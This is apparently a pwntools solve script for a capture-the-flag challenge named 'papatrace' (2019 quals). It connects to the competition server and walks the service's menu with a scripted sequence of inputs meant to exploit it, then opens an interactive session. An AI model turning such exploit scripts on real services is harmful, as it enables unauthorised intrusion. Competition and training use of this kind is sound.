#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='i386')
exe = './pitas.py'

host = args.HOST or 'papatrace.quals2019.oooverflow.io'
port = int(args.PORT or 5000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
def ch(s):
    io.recvuntil('Choice:')
    io.sendline(str(s))
def st(x):
    ch(1)
    io.sendlineafter('steps: ', str(x))

if args.LOCAL:
    ch(1)
else:
    ch(2)
ch(1)
ch(3)
io.sendline('05')
ch(2)
io.sendline('r12_52_64')
io.recv()
io.sendline('40')
ch(0)
st(13)
ch(6)
io.sendline('r12')
ch(5)
io.sendline('r12')
ch(7)
#st(1000)


io.interactive()
